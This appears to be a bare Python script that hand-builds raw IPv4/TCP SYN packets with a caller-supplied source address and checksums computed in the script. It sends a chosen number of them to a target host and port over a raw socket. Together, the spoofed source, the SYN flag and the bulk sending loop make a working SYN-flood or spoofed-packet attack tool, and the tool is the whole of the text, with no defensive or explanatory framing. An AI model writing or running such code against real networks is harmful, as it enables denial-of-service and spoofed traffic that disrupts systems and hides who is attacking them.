import socket, struct, sys
src, dst, dport, count = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4])
def csum(b):
    if len(b) % 2: b += b'\0'
    s = sum(struct.unpack('!%dH' % (len(b) // 2), b)); s = (s >> 16) + (s & 0xffff); s += s >> 16; return ~s & 0xffff
def pkt(i):
    ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, 1000 + i, 0, 64, 6, 0, socket.inet_aton(src), socket.inet_aton(dst)); ip = ip[:10] + struct.pack('!H', csum(ip)) + ip[12:]
    tcp = struct.pack('!HHLLBBHHH', 40000 + i, dport, i, 0, 0x50, 0x02, 8192, 0, 0)
    ph = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack('!BBH', 0, 6, 20); tcp = tcp[:16] + struct.pack('!H', csum(ph + tcp)) + tcp[18:]
    return ip + tcp
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
for i in range(count): s.sendto(pkt(i), (dst, 0))
print('sent', count)
